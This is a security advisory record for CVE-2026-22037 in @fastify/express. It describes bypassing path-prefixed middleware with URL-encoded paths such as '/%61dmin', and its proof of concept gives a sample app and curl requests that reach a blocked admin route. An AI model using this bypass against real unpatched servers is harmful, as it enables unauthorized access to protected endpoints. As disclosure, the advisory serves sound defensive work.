advisory_id: GHSA-g6q3-96cp-5r5m
datasource_id: github_osv_importer_v2/GHSA-g6q3-96cp-5r5m
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-g6q3-96cp-5r5m/GHSA-g6q3-96cp-5r5m.json
aliases:
  - CVE-2026-22037
summary: |
  @fastify/express vulnerable to Improper Handling of URL Encoding (Hex Encoding)
  ### Summary
  A security vulnerability exists in `@fastify/express` where middleware registered with a specific path prefix can be bypassed using URL-encoded characters (e.g., `/%61dmin` instead of `/admin`). While the middleware engine fails to match the encoded path and skips execution, the underlying Fastify router correctly decodes the path and matches the route handler, allowing attackers to access protected endpoints without the middleware constraints.

  ### Details
  The vulnerability is caused by how `@fastify/express` matches requests against registered middleware paths.

  ### PoC
  **Step 1:** Run the following Fastify application (save as `app.js`):

  ```javascript
  const fastify = require('fastify')({ logger: true });

  async function start() {
    // Register fastify-express for Express-style middleware support
    await fastify.register(require('@fastify/express'));

    // Middleware to block /admin route
    fastify.use('/admin', (req, res, next) => {
      res.statusCode = 403;
      res.end('Forbidden: Access to /admin is blocked');
    });

    // Sample routes
    fastify.get('/', async (request, reply) => {
      return { message: 'Welcome to the homepage' };
    });

    fastify.get('/admin', async (request, reply) => {
      return { message: 'Admin panel' };
    });

    fastify.get('/admin/dashboard', async (request, reply) => {
      return { message: 'Admin dashboard' };
    });

    // Start server
    try {
      await fastify.listen({ port: 3000 });
    } catch (err) {
      fastify.log.error(err);
      process.exit(1);
    }
  }

  start();
  ```

  **Step 2:** Execute the attack.

  ```
  ➜  ~ curl http://206.189.140.29:3000/%61dmin
  <!DOCTYPE html>
  <html lang="en">
  <head>
  <meta charset="utf-8">
  <title>Error</title>
  </head>
  <body>
  <pre>Cannot GET /%61dmin</pre>
  </body>
  </html>

  (fastify express)

  ➜  ~ curl http://206.189.140.29:3000/%61dmin
  {"message":"Admin panel"}
  ```

  It differs from [CVE-2026-22031](https://nvd.nist.gov/vuln/detail/CVE-2026-22031) because this is a different npm module with its own code.
impacted_packages:
  - purl: pkg:npm/%40fastify/express
    affected_versions: vers:npm/<=4.0.2
    fixed_versions: vers:npm/4.0.3
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '8.4'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-g6q3-96cp-5r5m/GHSA-g6q3-96cp-5r5m.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-177
  - CWE-288
references:
  - url: https://github.com/fastify/fastify-express
    reference_type:
    reference_id:
  - url: https://github.com/fastify/fastify-express/commit/dc02a3fe1387f945143f22597baa42557d549a40
    reference_type:
    reference_id:
  - url: https://github.com/fastify/fastify-express/releases/tag/v4.0.3
    reference_type:
    reference_id:
  - url: https://github.com/fastify/fastify-express/security/advisories/GHSA-g6q3-96cp-5r5m
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-22037
    reference_type:
    reference_id:
